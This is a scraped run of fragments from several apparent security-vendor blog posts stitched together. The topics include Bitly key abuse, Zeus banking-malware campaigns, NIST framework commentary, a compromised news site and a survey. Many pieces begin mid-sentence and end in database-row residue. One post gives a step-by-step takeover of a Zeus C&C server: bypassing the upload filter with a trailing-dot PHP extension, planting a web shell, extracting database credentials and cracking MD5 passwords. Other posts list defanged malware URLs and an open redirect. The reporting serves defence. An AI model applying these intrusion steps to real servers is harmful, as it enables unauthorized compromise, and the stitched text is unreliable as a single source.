though programming specifically, and there are certainly other methods for reducing risk in externalized APIs. What are you doing? Is your organization embracing the use of external APIs or do you find the practice still too risky?

Only 12 percent speak on a quarterly or more frequent basis and even this may not be sufficient to prepare policy and procedure to cope with the latest threats.\nSecurity Refresh\nSecurity concerns have moved on from the defacement of web real-estate and now focus firmly on targeted and persistent threats and data theft, with 64 percent of respondents acknowledging that one or the other were their primary security fear. Only 22 percent were confident that their existing security was strong enough in its current form, but significantly more (29 percent) felt that a complete overhaul of their security technologies was needed. This response is key to formulating an overall conclusion, as this is not the installation of a new program, or training a few key personnel, but a potentially global, multi-departmental, resource intensive project.\nRaising the Human Security IQ\nA necessity of dealing with the ever-evolving threats that cybercriminals use, is the need to maintain awareness of them and how to minimise their impact. Particularly now that these guidelines aren\'t as simple as \"don\'t open strange attachments or click on suspicious links\", I\'m concerned that 52 percent of respondent companies provide no cybersecurity education to their employees. Security teams feel that it will take a negative event such as theft of intellectual property (67 percent) or customer data (53 percent) to compel executive teams to take action and increase cybersecurity resources.\nProfessionals on the front line of cybersecurity have voiced their concerns that their existing countermeasures will not protect them, particularly against targeted, persistent data exfiltration attacks. These threats are evolving constantly, adapting to security updates and exploiting newly discovered vulnerabilities. Those organisations not educating employees or not adopting a complete risk-based security strategy will find themselves facing increasing risks with serious financial and reputational consequences.

In this case the real site is msnbc.com, which belongs to the well-known cable and satellite channel MSNBC. We have discovered that cyber criminals appear to have gained access to the publicly available MSNBC Bitly API key.  This is being abused to create custom URL shorteners. Websense Security Labs has been tracking fraudulent sites of this kind since 2012, but this was the first time that a redirection technique of this type was observed.\n\n\n	Executive Summary\n\n\n	The various methods used by this group include:\n\n\n		Use of publicly available Bitly API key for redirection\n	\n		Use of a famous news site to redirect to a fake news site\n	\n		Four redirection steps from real news site to fake news site\n	\n		Spreading the link through Google and Yahoo groups and spam mail\n\n	Here is the fake news site to which the user is directed, hosted on a legitimate-looking host of hxxp://fcxnws.com/:\n\n\n	\n\n\n	So far, Websense Security Labs has identified that the spam is spread through Google and Yahoo groups, and email.\n\n\n	Example post on Google groups:\n\n\n	\n\n\n	Example post on Yahoo groups:\n\n\n	\n\n\n	The full redirection chain goes as follows:\n\n\n	hxxp://on.msnbc.com/wMhlWc -->> using Bitly -->> hxxp://prolower.com/?630062283 -->> hxxp://fcxnws.com/\n\n\n	How is the Bitly service abused?\n\n\n	Bitly is a service to shorten URLs into a more user-friendly format. Shortened URLs are very convenient as they are easier to exchange due to their length, and can improve the look of a message. Businesses can set up their own \'short domains\' and change their DNS settings to Bitly\'s servers. Each Bitly customer has their own API key that they can use to generate short URLs from full URLs. If the API key relates to an account that has set up their own short domain, the custom short domain will be used when generating a short URL.\n\n\n	For example, if the API key relates to MSNBC\'s Bitly account then a short URL using hxxp://on.msnbc.com/ will be used instead of hxxp://bit.ly/. In this case the Bitly API key was publicly available and mis-used by the spammers to redirect from hxxp://on.msnbc.com/ through the redirection chain.\n\n\n	To obtain stats for a Bitly URL the \'+\' character can be added at the end of it. For example the hxxp://on.msnbc.com/wMhlW link becomes hxxp://on.msnbc.com/wMhlWc+ . This reveals some interesting information: in this case, the spam was delivered 2054 times based on the click count.\n\n\n	Statistics from Bitly\'s data:\n\n\n	\n\n\n	How are Bitly protecting their users?\n\n\n	Bitly are currently blocking the redirection page at the time of writing.  Kudos to them.\n\n\n	\n\n\n	More related abuse vectors on MSNBC\n\n\n	During this investigation Websense observed another flaw with similar impact. The following logout page has an unvalidated redirect flaw that can be used to send a user anywhere on the Internet.\n\n\n	hxxps://secure.nbcnews.com/_tps/accounts/logout?redirect=http://www.google.com.\n\n\n	In this case it\'s the Google search engine, but it can be a malicious website. Bitly uses the nbcnews.to domain when shortening URLs from MSNBC. The example with the unvalidated logout page above would be shortened by bitly as follows:\n\n\n	hxxp://nbcnews.to/1rvqfxX\n\n\n	This means that the user will see a valid shortened URL from Bitly that belongs to NBC News and redirects to a valid NBC News domain. However the next step is another redirection that could lead anywhere on the Internet. This method may trick users into believing that this is a valid NBC news URL, leading to a double level of confusion for the victim as well as for security filters.\n\n\n	We have contacted the MSNBC team to alert them to these issues.\n\n\n	Websense Protection\n\n\n	Websense customers are protected against this threat with ACE, our Advanced Classification Engine, at the stages detailed below:\n\n\n		Stage 2 (Lure) – ACE protects against lure email messages containing the threat, as well as other type of lure examples.\n	\n		Stage 3 (Redirects) – The Websense product is able to follow each redirect in turn to permit classification.\n\n	Recommendations\n\n\n	Websense Security Labs identified other websites that keep their Bitly API key in public view. Exposing your Bitly API key is a risk if you have a short domain, as it allows anybody to generate short URLs on your short domain that redirect to anywhere of that person\'s choosing. This can make it appear as if your business is the one redirecting to malware/phishing/fraud etc. Fortunately, there\'s not much more that anybody can do with an API key as any account-related or link editing features can only be accessed after an OAuth login.\n\n\n	All requests to the Bitly API should be done on the website\'s back end, on the server-side. This means that the API key will never be seen by public users on the front end and your API key remains safe.\n\n\n	You can read about Bitly\'s API best practices here: http://dev.bitly.com/best_practices.html.\n\n\n	URL shorteners are very useful, but come with their own security risks and should be used with caution from a developer and from a user point of view.', 'https://www.forcepoint.com/blog/security-labs/bitly-api-key-and-msnbc-unvalidated-redirects\n');

The Zeus variants in the campaign we\'re about to describe also appear to be using Zeus droppers that employ the hidden Windows \'PIF\' file extension - a file extension that used to be popular many years back, that was often associated with viruses then, and that appears to be making a comeback.\n\nWebsense® ThreatSeeker® Intelligence Cloud has been tracking a malicious low volume email campaign over the last months that employs exploits and social engineering tricks to spread the evolving breed of the Zeus banking malware. Specifically, the Zeus variants spotted in the campaign have been seen to persistently evolve and adapt their methods to implement information stealing procedures (a.k.a. \'hooking procedures\') that are a direct evolution of a previous variant dubbed \'Zberp\'. This trend indicates a clear persistent effort to evade detection from client-side security software.\n\nIn this blog we\'re going to take a look at some email examples and prototype the lure emails that are part of this campaign. Furthermore, we\'re going to take a look at how we believe the actors behind the Zeus strain seen in the campaign modified Zeus\' hooking routines persistently, and employed other tactics in order to evade detection by client-side security software and network-based security software.\n\nCo-Writer: Nick Griffin.\n\nThe Lure Emails \n\nThe lure emails typically hold subjects that are aimed to entice the target to download and run a file from a URL. For example, messages have been seen to include subjects like: \"eFax message from fax #\", \"Payment confirmation\", \"Pending consumer complain\", \"Failed delivery for package\", etc. The email messages don\'t contain file attachments, but rather a URL link to a ZIP file that contains a PIF file that is the Trojan Zeus Dropper. PIF is another executable extension (like .exe, etc.) and it operates like other executable files. One of the direct advantages of the PIF file is that the extension is hidden even if Windows is configured to show file extensions of known file types. The additional direct advantage of using PIF files with this campaign is that the lures are sent as \'PDF\' files that are actually PIF files, which is a direct attempt to deceive the user in case they are able to see the extension.\nAt first we were surprised to see PIF files used with this campaign because PIF files are most often associated with old virus threats that existed many years ago, and the file extension is not often seen to be used by modern malware. PIF files (Program Information Files) were created to serve specific functionality that defines how a given DOS program should be run. PIFs are analyzed by Windows\' ShellExecute function and are run as specified by their content, not extension, which makes them convenient to use in social engineering tricks because their file extension does not appear to the target, which improves the chances that the target will double-click on the file attempting to run it, thereby getting infected.\nZeus dropper Inside the ZIP file example:\n\n\nThe lure emails\' content seems to be of good quality. The messages do not contain spelling mistakes and include, at times, pictures in order to appear more convincing (some example screenshots are included below). The URLs used in the messages that lead to Zeus Droppers appear to be of two kinds; some are URLs that were registered only for a few days, and some utilize compromised websites. The Zeus PIF dropper files, as often seen with modern malware, appear to be \'crypted\', which is a term used to describe that the file was \'repackaged\' for the purpose of evading antivirus detection and other file scanning solutions.\n\nLast week we observed this campaign using email themes that appeal to Canadian targets, and we noticed that the dropped Zeus variants specifically targeted Canadian banks (more on that in the next section).\n\nHere are a few VirusTotal references to the Zeus PIF Dropper included in this campaign and screenshots of the lure emails they were a part of:\n\nEmail subject: Failed delivery for package #1398402\nFile name: pdf_canpost_RT000961269SG.zip\nVirusTotal detection rate: 2%.\nThreatScope analysis: link\nEmail subject: Pending consumer complaint\nFile name: ftc_pdf_complaint.zip\nVirusTotal detection rate: 11% \nThreatScope analysis: link\n\nEmail subject: Your Order #742830017 - PROCESSED\nFile name: pdf_eticket_QB742830017CA.zip\nVirusTotal detection rate: 9% \nThreatScope analysis: link\n\nLure email examples:\n\n\n\n\n\n\nHooking Detection Evasion Evolution\n\nLooking under the hood and digging into the Zeus binaries spreading throughout this campaign shows the efforts made to evade client-side security software, especially the security software that aims to alert on \'malicious hooks\' - the places on the computer where the malware inserts procedures aimed to eavesdrop on legitimate processes like browsers. One interesting observation is that the code seems to be an evolution of the \'hooking\' procedures used by the Zeus variant known as \'Zberp\'. On top of the \'hooking\' changes, it is interesting to see that the format of the configuration file is a modification of the one used by frequently seen Zeus variants. In the following screenshots you can see a snapshot series representing the evolution of the changing patterns aimed to evade detection as spotted with the Zeus PIF variants in this campaign in comparison to \'Zberp\':\n\nHooking evolution:\n\n\n\n\n\n\nThe Growing Importance Of SSL Content Inspection\n\nUpon decryption of the Zeus configuration files used in this campaign, it\'s evident that the bot communicates and \'calls home\' to its command and control servers using HTTPS. The Zeus configuration file contains a number of entries that indicate that HTTPS is utilized (HTTP + SSL encryption). Screenshots below show the URL the bot calls to download an update, and the URL the bot calls to drop stolen information.\n\nAfter looking into the command and control domains, it was found that they all had valid and signed certificates, for a short period of 3 months, from a certification authority known as \'Comodo Essential SSL\' (see screenshots of certificates below). Modern browsers normally give a layer of defense to browsing users against untrusted certificates by alerting and blocking access to the website, which unfortunately in this instance is not the case. This gives the actors behind this campaign another layer of resilience and anonymity because their malicious domains appear to be more trusted and at the same time pose a much bigger challenge to inspect because network communication is encrypted by SSL. This could explain why the domains involved with the variants we\'ve looked into for this blog have low detection rates: \n\nhxxps://billing-service.ru/skinny/phpinfo.php - VirusTotal detection rate: 4%.\nhxxps://invoice-maker.ru/flash/flashplayer.exe - VirusTotal deection rate: 2%\nhxxp://crypto-coinz.ru/pizza.jpg - VirusTotal detection rate: 2%\nhxxps://secure-checker.com - VirusTotal detection rate: 2%\n\nYou may ask yourself, Why is SSL inspection important? Imagine that you have a sandbox on your network that inspects executables that go through your network. If your sandbox solution does not use SSL inspection it will not see a file that has gone through the network encrypted with SSL. In this case, the bot can update itself by downloading an executable file using SSL, which will defeat any sandbox that doesn\'t employ SSL inspection. For example: hxxps://invoice-maker.ru/flash/flashplayer.exe .\n\nZeus PIF variant configuration file:\n\n\nValid certificates employed by the command and control servers:\n\n\nZeus configuration file and the list of web injects targeting various banks in Canada:\n\nWebsense customers are protected against this threat with ACE, our Advanced Classification Engine, at the stages detailed below:\nStage 2 (Lure) – ACE protects against lure email messages containing the threat.\n  Stage 4 (Exploit Kit) – ACE has real-time detection for exploit code that attempts to deliver the threat.\n  Stage 5 (Payload) – ACE has detection for the malicious payloads delivered by this threat; SSL inspection is supported with Websense® TRITON® ThreatScope™\n  Stage 6 (Call Home) – ACE detects the communication to the associated C&C in real-time, supported by SSL inspection.\nConclusion\n\nIn this blog we covered a malicious email campaign that employs an evolving strain of the infamous Zeus malware. The campaign has been ongoing for months in bursts of low volume attacks that have been evolving to evade detection employed by client-side security software. The actors behind this campaign seem to be savvy and in-the-know regarding what is needed to accommodate durability and to sustain \'longer periods\' of undetected covert activity from their main criminal tool, the Zeus bot. The persistence of the actors behind this campaign is represented in their continual effort to change and modify the \'DNA\' of the Zeus bot in order to avoid detection and by utilizing other techniques, like command and control servers that utilize SSL to sustain the duration and success of their campaign, which has the ultimate purpose of data theft.\nWe also managed to connect the previously observed \'Zberp\' Zeus strain to this campaign in terms of evolution. This shows that the \'cat and mouse\' game is ever continuing. Because the Zeus source code was leaked back in 2011, many evolving variants of the bot started to spawn by different cyber-criminal groups. New variants have been given different names, and we believe the list of variants is going to grow. Strains that may at first look quite different, often have the familiar Zeus at their core. Tracking and dissecting the evolution of a malware strain allows us to know exactly the technological challenges that come with it and what is required to stop it.', 'https://www.forcepoint.com/security-labs/zeus-pif-evolving-strain-looking-defeat-your-security-software\n');

The main difference is that the framework has utilized pieces and parts of other standards to unify language that businesses can unite under. This allows organizations to focus on business drivers to guide security activities. \n\nFor a long time, standards pitched a containerized way of thinking about security and the associated controls. This functional approach is described in the Five Step Lifecycle the framework rests upon. These five steps (Identify, Protect, Detect, Respond and Recover) move us away from the risk and list oriented approach of discussing and implementing security controls. This forward movement also transitions security programs from reactive to strategy-oriented, which means it is an ongoing\njourney and not a \"one and done\" initiative. It also has undertones of security being everyone\'s issue and it provides opportunities for everyone to be part of the solution versus the model of many standards, centering on the accountability of few organizations with little to no executive buy-in.\n\nQ. Does the framework only addresses the here and now versus the next generation of bad guy attacks?\n\nI believe the framework is scalable and will provide a methodology to deal with todays\' threats and tomorrow\'s challenges.

The program will serve as a point of contact and resource to assist organizations with framework use and public and private sector assistance and guidance.\nQ. How do businesses transform the topic of security from a technology issue to a business issue?\nThe general spirit of the framework is focused on utilizing business drivers to guide cybersecurity activities. These activities, in turn, become part of your organization\'s threat and business risk management processes and strategies.\nThe framework emphasizes that security is a journey, requiring continuous improvement and an emphasis on security as a business process.

How does a business move from classification to data sensitivity?\nData classification is built out of a compliance framework and requires a long drawn out discovery process that\'s only effective for a point in time. This process requires a business to store things everywhere and it\'s never finished.\nThe NIST framework gives a process for moving from classification to data sensitivity by putting a laser focus on high-value information assets. Organizations need to move away from storing and classifying to a system that provides visibility into what data you have, what\'s most important and who has access to it. The framework changes the old paradigm of making check lists to having a better understanding of the crown jewels.\nHere are a few recommendations for achieving data sensitivity:\nGain visibility into systems and end user populations.\n  Decide what data is important to you, such as social security numbers, and then identify what groups are using the information.\n  Have visibility into how employees are using the information and where it\'s going. Also, understand how are they sharing the information and through what systems.\n  Put controls around the data that is most important to your organization.', 'https://www.forcepoint.com/insights/demystifying-nist-%E2%80%93-part-2-%E2%80%93-implementation\n');

The order called for the development of a voluntary, risk-based Cybersecurity Framework - a set of existing standards, guidelines and practices to help organizations manage cyber risks. The executive order designated the National Institute of Standards and Technology (NIST) to coordinate and lead this initiative.\n\nNIST recently released a highly anticipated framework, providing a common language to address and manage cyber risk cost-effectively. The framework is designed to help organizations develop information security protection programs based on business needs. It offers best practices for voluntary use across critical infrastructure sectors including government, healthcare, financial services and transportation industries.\n\nA few short months after the release of the new framework, many unanswered questions remain, including: how will the new policy affect the security of critical infrastructure, comparative standards and those areas not currently classified as critical infrastructure? Below are some of my thoughts on what you really need to know about the cybersecurity framework and its trickle-down effects. This is the first of a three-part series on this topic.\n\nPART 1 - IMPACT\n\nQ. How will the framework affect businesses? What is the business incentive to adopt the guidance and will there eventually be a certification attesting adoption of the framework?\n\nThe framework attempts to be a focal point of all the standards and leading practices. However, the guidance is optional at this point. I envision there will be a push from the insurance communities and the vendor communities to provide some sort of \"certification\" or \"attestation\" to your adherence/implementation of the framework. This could result in the reduction of premiums for those that apply the framework to their business, or establish a case for security negligence if the framework is not implemented. Regardless of any need or requirement to implement the framework in a business, the NIST report represents a positive collaboration between public and private sectors. A common risk-based approach to security can add additional layers of protection. Why not implement it?\n\nQ. What industries will it impact the most and why? What industries are directly impacted and which ones have indirect implications (e.g., providers, suppliers, private sector, Information technology, communications sectors and commercial technology products and services groups).\n\nAs the framework was intended to address entities denoted as critical infrastructure, I believe it will be applicable to all if both the public and private sector agree on a lifecycle-based security paradigm.  If it\'s applicable for government entities (critical infrastructure, national security), it will logically also stretch to those organizations that conduct business with government entities. From there, I see it continuing to spread down the proverbial food chain.\n\nGiven the origin of the framework, I believe all organizations will be put in the position to discuss \"Why not implement it?\" If your current program is built on some of the underlying standards, you may be closer than you think to implementation. In this case, the framework may simply provide a standardize mechanism for you to discuss your program and manage continuous improvement.\n\nQ. Will it have any effect and protect critical infrastructure and enterprise from cyberattacks?\n\nI believe the framework will have a positive effect on both enterprise and critical infrastructure alike. The positive effects will be driven from two vectors: through both the introduction and the implementation of the framework. I\'ll explain more in the next blog post addressing NIST Implementation.\n\nQ. Will the framework have serious impact on the security of critical infrastructure? What are the issues that remain that could stifle the favorable movement of the country\'s security posture.\n\nI believe it will be a pillar in our nation\'s security plan. That said, the government will be focusing on industries connected to national security. Items and industries not tagged with this designation will have less pressure to adopt the framework. To use this framework to its maximum benefit, those outside of national security must also embrace and map their security business processes to the framework.', 'https://www.forcepoint.com/insights/demystifying-nist-%E2%80%93-what-new-cybersecurity-framework-means-you\n');

When a user browses to the main website, the injected code loads automatically and silently redirects the user to a website serving the actual exploit code. The injected code is obfuscated and can be found at the bottom of legitimate JavaScript pages on AskMen\'s website.\n\nThe injected code on AskMen\'s website:\n\n\nHow DGA is used to redirect the user\n\nThe obfuscation used here is a simple base64 encoding, which can be easily de-obfuscated to a Redirect to a website generated by its domain generation algorithm (DGA) as well as the DGA itself.\n\nDe-obfuscated JavaScript code:\n\n\nWhat the above code does is basically this: It takes the current date (year, month, and day) and uses a CRC32 algorithm as a hash function to hash that data, which ends up being the domain name.

For example, the domains that will be generated in the next 7 days (from 24 to 30 June) can be seen below.\n\nExploit page URLs from 24 to 30 June:\n\n\nThe Redirect takes the unsuspecting user to a heavily obfuscated page serving a Java exploit (most likely CVE-2013-2465) and also an Adobe PDF reader exploit.\n\nThe exploit page:\n\n\nJava exploit:\n\n\nNuclear Pack Exploit Kit\n\nThe exploit page displays similar obfuscation techniques, which are often used in the Nuclear Pack exploit kit. In addition, the above mentioned Java exploit is most often used by Nuclear Pack. These facts strongly indicate that the attacker is using either the Nuclear Pack exploit kit or a variant of it.\nThe similarities between the obfuscation methods can be seen below. For example, note how the eval() function is obfuscated when some color name is inserted in the middle of the string. The page uses this as the default background and the string is removed dynamically at runtime. So \"eblackval\" will successfully be evaluated as \"eval\".\n\nAskMen exploit page:\n\n\n\nNuclear Pack exploit kit page:\n\n\n\nMalware\n\nOnce the target is successfully exploited, the infamous malware Caphaw is dropped, allowing the attacker unfettered access to the victim\'s computer. \n\nWebsense ThreatScope identifies the dropped file as \"Suspicious\":\n\nHere is the full ThreatScope Report.\n\nConclusion\n\nAs we can see, even very popular websites are not immune to malicious code injection attacks.

They\'re learning that it\'s not so easy to write secure code. In fact, most of us in the business of securing our applications and systems know that bulletproofing software is an extremely expensive and exhaustive undertaking. Most attackers lack the necessary resources and community peer review to harden their malware, and that provides an opportunity for the security community to advance a conversation about what we should do about it.\n\n\n	Some food for thought:\n\n\n		Hackers hide in the shadows and thrive in anonymity; probing their attack networks would shine a light on their own techniques and tactics\n	\n		Law enforcement and the security community could use the information to track down suspects and shut down attack infrastructure\n	\n		Malware creators who have to look to their own defenses would have to slow down the production of new attacks\n\n	Is it legal? Is it ethical? Let\'s look at a vulnerability in the C&C of a Zeus Trojan in circulation and envision the possibilities together.\n\n\n	The Vulnerability\n\n\n	As we have explained in previous blogs, Zeus is a banking Trojan, which is designed to steal login credentials and other Personally Identifiable Information (PII). In this analysis, we will demonstrate that malware authors make numerous mistakes as regular software engineers and show how a particular publicly known vulnerability present in the Zeus C&C server can lead to full access to the botnet’s Command Panel or possibly full system compromise of the server. We have set up our own Zeus C&C and bot in our internal research network where we can simulate this attack and show its implications.\n\n\n	In order to understand why the vulnerability exists in the first place, we must understand the basic workings of Zeus. Zeus bots operate in the following pattern: 1) Infect a system 2) Gather credentials and PII, and 3) Upload the stolen data in the form of reports to the C&C Server. The crucial point here is that the bot uploads some file to the remote server. What if we could leverage this mechanism to impersonate a bot and upload our own file to the server? Let’s say an executable, with which we could execute commands on the server.  \n\n\n	Unfortunately, we can’t just simply upload a file. Zeus uses RC4 algorithm to encrypt all communications between the bot and the server, so it will only accept files if they are encrypted with the same key that the server uses. Luckily for us, RC4 is a symmetric cipher, which means that both parties (in this case the bot and the C&C) use the same pre-shared key. This further implies that the key is embedded somewhere in the bot. So we need to capture a Zeus binary and find the keys in order to be able to communicate with the C&C. We can achieve this by using the Volatility memory analysis tool to dump the RC4 keystream from an infected machine’s memory.\n\n\n	\n\n\n	Now that we have the key, we can use this key to encrypt the file we want to upload, thus impersonating a bot trying to upload a report. However, the C&C tries to make sure that only valid report files are ever uploaded, and what we want to upload is not going to be a valid report file. We would like to execute something on the server, so we need to upload an executable file, which the server knows how to execute. We know that the C&C is using .php files, therefore, we will try to upload a php file too, which will be executed on the server side by the PHP interpreter. But, the server won\'t let us upload .php files, however, there is a vulnerability in the C&C’s code and a well-known technique to bypass the checks they are performing on uploaded files. Below is the code for checking which file extensions are allowed.\n\n\n	\n\n\n	As you can see, it doesn’t allow us to upload any PHP file or .htaccess file in addition to a lot of other possibly executable files. The problem lies in the fact that this sort of very simple check can be easily bypassed. One of the most widely used bypass methods is to use a trailing dot with the file extension, that is, instead of just filename.php we can use filename.php. (note the additional dot after the php). The PHP interpreter is quite liberal, and it will interpret it as a valid php file. With PHP we could execute a number of commands on the server, but in our case, we would like to get access to the control panel, so we will use a PHP web-shell (we have talked about web-shells in a previous blog) , which will allow us to browse the filesystem, interact with the backend database, and (possibly, depending on the server configuration) execute system commands.\n\n\n	Now, we have everything we need to compromise the C&C server: the RC4 key, the file we want to upload (web-shell), and a way to bypass the checks. By default, Zeus C&C’s use gate.php to receive the reports, and they will store these reports in C&C’s IP/_reports/files/BOTNET_ID/BOTID/ directory.\n\n\n	\n\n\n	Since we are impersonating a bot, we control both the BOTNET_ID and BOTID values, so we can predict where our uploaded file will end up. All we have to do after uploading our file is to browse to this location and our code will be executed.\n\n\n	After we browse to the uploaded file, we are presented with a web-shell.\n\n\n	\n\n\n	Now, this shell will enable us to browse to files containing important information about the particular Zeus C&C and also to interact with the backend SQL database.\n\n\n	Please note that while we have set up Zeus on a Windows XP machine in our own testing environment, usually Zeus C&C’s in the wild run on Linux servers. Furthermore, our server shown here was set up with very liberal file permissions, which is rarely the case with Zeus C&C’s in the wild. However, this is irrelevant in this case, since we are trying to gain access to the Control Panel. It would only matter if we tried to fully compromise the server by gaining a remote shell  and escalating our privileges to root or NTAUTHORITY\\SYSTEM (depending on the operating system).\n\n\n	In order to gain access to the Control Panel, we need to get hold of the password for it, which is stored in the MYSQL database. However, the database is password- protected, too. Fortunately for us, since the bot needs to interact with the database, the credentials are stored in one of the configuration files of the bot, namely in config.php under /system/ directory.\n\n\n	\n\n\n	While it contains other interesting information (such as a bot encryption key), only the relevant part of the config file is shown here. Normally, mysql_user is changed to something different from root, and mysql_pass is usually something more complex, but we intentionally left it as \"password.\" With these credentials, we can gain access to the backend database.\n\n\n	The database stores information about the bots in the botnet, reports the bots uploaded, and finally, one table is used for storing information about the Control Panel user, such as username, hashed password, and so on.\n\n\n	\n\n\n	Zeus stores these passwords using a simple MD5 hash without any salting, thus they are relatively easy to crack. Another option would be – since we have full read/write access to the database – to create our own password, hash it with MD5, and insert that into the database instead of the current password. Now, we will try to crack the password, hoping that it is not a very strong one. If it is, we can still fall back on the second method of gaining access.\n\n\n	\n\n\n	As you can see, it was indeed a very weak password (\"123456\") making it easy to crack. At this point, we have all the information we need to finally enter the Zeus C&C’s Control Panel.\n\n\n	We can simply browse to ./cp.php and log in with our newly acquired credentials.\n\n\n	\n\n\n	We now have full access to the Zeus C&C’s Control Panel, just as the original botnet owner would.\n\n\n	\n\n\n	Summary\n\n\n	As we have demonstrated, while Zeus is regarded as an ‘advanced’ banking Trojan it is also susceptible to bugs that may allow, in an ironic twist, an attacker with the technical skillset to take over a botnet’s C&C server. While our previous blog posts went into details regarding the internal details of the Zeus bot, in this blog post, we tried to provide a different perspective and an insider look into how the C&C server operates.\n\n\n	Now, what should we do about it?', 'https://www.forcepoint.com/blog/security-labs/putting-cyber-criminals-notice-watch-your-flank\n');

One such variant is dubbed ‘GameOver’, which recently made a mark in the media after its infrastructure was seized by authorities.\n\nThe Websense® ThreatSeeker® Intelligence Cloud actively monitors this specific type of threat. In this blog, we illustrate some key metrics about Zeus GameOver.\n\nContributors: Nick Griffin, Elad Sharf, Ran Mosessco\n\nUpdate: Do you have 3 minutes? See how Zeus Gameover steals your data in our new video. Better still; find out how to protect.\n\n\n\nUpdate 2 [July 14 , 2014]: As we expected to see, Zeus GameOver has returned and evolved. The new variant has replaced the old peer-to-peer networking in favour of a Fast-Flux based infrastructure. In addition, the new domain generation algorithm (DGA) now generates domains using digits as well as letters, but no longer uses the .info or .ru TLDs.  Websense customers continue to be protected from this threat at the same stages of the threat lifecycle as listed at the foot of this blog.\n\nBackground & Information\n\nZeus GameOver was first seen in 2011 and is very similar to the original Zeus malware. Its main use is for Crimeware purposes, such as seeking financial gain by stealing credentials and even transferring funds from victims accounts. We have also seen GameOver subsequently download malware such as Cryptolocker.\n\nThere is an important difference between GameOver and other Zeus variants, though. In a typical Zeus (or Zbot) malware, a central Command and Control (C&C) point is used to send out data and receive commands. In GameOver, however, the infrastructure is decentralized and instead relies on peer-to-peer (P2P) technology for its C&C capabilities.\n\nThis change in C&C infrastructure has become a big challenge for the security industry, because there is no single point of failure, such as the ability to take down a single command and control node.  The Websense® ThreatSeeker® Intelligence Cloud is actively aware of this network and defends against it across the majority of the 7 stages of advanced threats model.\n\nIt\'s very important to note that Zeus GameOver is not directly sent to a potential victim. Instead, a downloader is involved in the initial infection, such as Pony Loader, and more recently, Upatre. Historically, the attack vectors have been mostly emails, usually sent by the Cutwail spam botnet. In the past, a mix of direct attachments, as well as URLs leading to exploit kits, would drop downloaders onto a victim\'s computer. More recently, with Upatre gaining momentum due to its ability to evade AV detection, the focus has been mostly on attachments, but in the past few weeks we have seen email lures containing URLs using sites such as Dropbox to serve Zip files containing Upatre. What\'s particularly nasty about Upatre is that it downloads Zeus GameOver in an encrypted form that bypasses most firewall and intrusion prevention system file-type detection. Another artifact that often gets bundled is the Necrus rootkit trojan, which helps to keep the infection persistent.\n\nCampaign\n\nIn the last two months we have seen increasing activity in the GameOver malware downloads via Upatre, with the last week being particularly active. The next table shows the top 10 affected countries we have seen affected by Zeus GameOver.  While the United States has been the most targeted country of this campaign, the threat has moved toward a wider global reach recently.\n\nUnited States\n			       \n			48.793%\n		United Kingdom\n			 \n			6.752%\n		Italy \n			 \n			4.980%\n		Malaysia \n			 \n			3.043%\n		Canada \n			 \n			2.586%\n		Mexico \n			 \n			1.527%\n		Jordan \n			 \n			1.309%\n		Turkey \n			 \n			1.307%\n		Costa Rica \n			 \n			1.084%\n		New Caledonia \n			 \n			1.068%\n		Table 1: Top 10 affected countries by Zeus GameOver\n\nThe next heatmap video shows how dominant the GameOver variant has been in April and May of this year.\n\n\n\nInterestingly (and you might say very much expected), the main target of Zeus GameOver campaigns has been the financial industry, with a trend towards targeting victims at companies in the pension management sector of the financial industry. The next table shows the top 5 industries that Zeus GameOver targets:\n\nRetirement & Pension Management \n			       \n			36.036%\n		Education \n			 \n			27.59%\n		Services \n			 \n			7.536%\n		Manufacturing\n			 \n			6.715%\n		Finance, Insurance & Real Estate \n			 \n			5.901%\n		Table 2: Top 5 affected industries by Zeus GameOver\n\nCase Study\n\nHere\'s a recent example of an email attack stopped by Websense Cloud Email Security (CES). The attack tried to entice victims to open a ZIP attachment containing the Upatre downloader on their computer, which would later infect the users with Zeus GameOver.\n\n\n\nWebsense ThreatScope behavioral analysis recognizes Upatre as malicious:\n\n\n\nhttp://csi.websense.com/ThreatScope/FileAnalysis?requestId=abb8734e-0a99-4405-adfc-a350002496fa\n\nThe target URL containing the encrypted binary is categorized as MWS, therefore stopping the infection before Zeus GameOver even gets to the victim\'s computer:\n\nhxxp://footballmerch.com/media/css/Targ-2105USmw.tar\n\nWebsense customers are protected with ACE™, our Advanced Classification Engine, at the stages detailed below:\n\nStage 2 (Lure) - ACE has proactive detection for the email lures.\n	Stage 4 (Exploit Kit) – ACE has detection for the malicious code that attempts to execute this cyber-attack. This stage may or may not exist, lately exploit kits have fallen out of favor with the criminals behind Zeus GameOver.\n	Stage 5 (Dropper Files) – ACE has detection for the binary files associated with this attack. Additionally, ThreatScope behavioral analysis classifies the binary\'s behavior as malicious or suspicious.\n	Stage 6 (Call Home) – Communication to the associated C&C server is prevented.\nSummary\n\nGameOver has been around for several years, and since its inception has been a challenge for the security industry to defend against, because different variants have appeared, and also because its source code was leaked. Websense researchers recommend utilizing a strong email security product, which will proactively block campaigns and prevent infection from GameOver from ever happening. The Websense® ThreatSeeker® Intelligence Cloud has seen a notable increase in its activity over the last two months leading up to the takedown of GameOver, and continue to monitor closely.', 'https://www.forcepoint.com/blog/security-labs/zeus-gameover\n');

As a security researcher, I wanted to provide my interpretation of these results and highlight how other security professionals can use these findings to start productive conversations with their leadership. \nThe responses to the Ponemon Institute’s inquiry paint an interesting picture. Security professionals overwhelmingly believe:• Their companies are not prepared for today’s security threats• Current security technology provides little or no insight on data loss and cybercriminal activity• Executives do not believe that data breaches will lead to loss of revenue \n\nDeficient Security Tools\nIt’s clear that respondents felt their current security tools are deficient in their capabilities, lack reporting, or are oversold and over-marketed. For example, 63 percent of respondents doubt they can stop the exfiltration of confidential information. Sixty-nine percent believe cybersecurity threats sometimes fall through the cracks of their companies’ existing security systems. As a result, it’s important to note that the remaining 37 and 31 percent may have a false sense of security that they can or are preventing all manner of threats. \nAll of these statistics reflect a stark reality – there is no 100 percent silver bullet solution in any category of security tools. However, the very fact that a large percentage of the respondents (69 percent) believe that their existing security systems are missing some of the attacks means that the false sense of security is decreasing. More organizations are realizing that one or two point solutions just aren’t going to cut it.\n\nLimited Cybercriminal Activity Visibility, Disconnected Perceived Value of Data\nFifty-nine percent of respondents indicated they do not have adequate intelligence or are unsure about attempted attacks and their impact. I do not think this reflects negatively on the practitioner’s professional acumen. Instead, I would say this is a positive. Security pros want more capabilities, more actionable intelligence and more intelligence sharing. \nThis desire for more information serves a number of purposes. We want to be more effective in our job and we want to help educate our leaders. It is critical that our executive teams understand how a lack of strong security can have a significant impact on the business. \nEighty percent of respondents said their company\'s leaders do not equate losing confidential data with a potential loss of revenue. I was surprised at the apparent disconnect. I’ve had the benefit in my career of having business leaders that understood the value of 